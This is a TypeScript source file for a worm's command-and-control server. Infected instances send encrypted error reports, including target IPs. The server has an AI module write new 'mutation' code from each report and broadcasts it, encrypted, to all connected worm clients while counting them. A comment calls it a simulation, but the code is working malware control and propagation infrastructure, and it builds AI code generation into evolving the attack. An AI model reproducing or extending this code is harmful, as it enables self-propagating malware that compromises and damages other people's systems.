import express from 'express';
import { createServer } from 'http';
import { Server } from 'socket.io';
import path from 'path';
import { logger } from './utils/logger.js';
import { encrypt, decrypt } from './modules/crypto.js';
import { generateMutation } from './modules/ai.js';
import { ErrorLog } from '../types/index.js';
import fs from 'fs';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const httpServer = createServer(app);
const io = new Server(httpServer, {
    cors: {
        origin: "*", // Allow all origins for this simulation
    }
});

const PORT = process.env.C2_PORT || 4000;

app.use(express.json() as any);

// Type guard to check if an object is a valid ErrorLog
function isErrorLog(obj: any): obj is ErrorLog {
    return obj && typeof obj.type === 'string' && typeof obj.details === 'string' && typeof obj.targetIp === 'string';
}

app.post('/api/report', async (req, res) => {
    const { instanceId, payload, key } = req.body;
    
    if (!instanceId || !payload || !key) {
        logger.warn('C2 Website: Received invalid report (missing instanceId, payload, or key).');
        return res.status(400).send('Invalid report format');
    }

    try {
        const decryptedReport = decrypt(payload, key);
        if (!isErrorLog(decryptedReport)) {
            throw new Error('Decryption failed or payload is not a valid ErrorLog.');
        }
        logger.info(`C2 Website: Received valid report from instance ${instanceId}: ${JSON.stringify(decryptedReport)}`);
        
        io.emit('worm_event', {
            type: 'report',
            instanceId,
            data: decryptedReport,
        });

        logger.info(`C2 Website: Requesting new mutation from AI engine...`);
        const aiGeneratedCode = await generateMutation(decryptedReport);

        if (!aiGeneratedCode) {
            logger.error(`C2 Website: AI Engine failed to provide a mutation. No update will be broadcast.`);
            return res.status(500).json({ message: 'AI engine failed, report received but no mutation generated.' });
        }
        
        logger.info(`C2 Website: Broadcasting AI-generated mutation to all clients.`);
        
        const encryptedCode = encrypt({ code: aiGeneratedCode }, key);
        
        io.emit('update', { payload: encryptedCode, key });
        
        io.emit('worm_event', {
            type: 'mutation',
            instanceId,
            data: { mutation: `AI Generated: ${aiGeneratedCode.substring(0, 80)}...` }
        });

        res.status(200).json({ message: 'Report received and AI-generated mutation broadcasted.' });

    } catch (e: any) {
        logger.error(`C2 Website: Failed to process report from ${instanceId}. Error: ${e.message}`);
        res.status(500).send('Error processing report.');
    }
});

io.on('connection', (socket) => {
    logger.info(`C2 Website: Client connected: ${socket.id}`);
    
    io.emit('worm_event', {
        type: 'connect',
        instanceId: socket.id,
        data: { wormCount: io.engine.clientsCount }
    });

    socket.on('disconnect', () => {
        logger.info(`C2 Website: Client disconnected: ${socket.id}`);
        io.emit('worm_event', {
            type: 'disconnect',
            instanceId: socket.id,
            data: { wormCount: io.engine.clientsCount }
        });
    });
});

httpServer.listen(PORT, () => {
    logger.info(`C2 Backend server is live on http://localhost:${PORT}`);
});
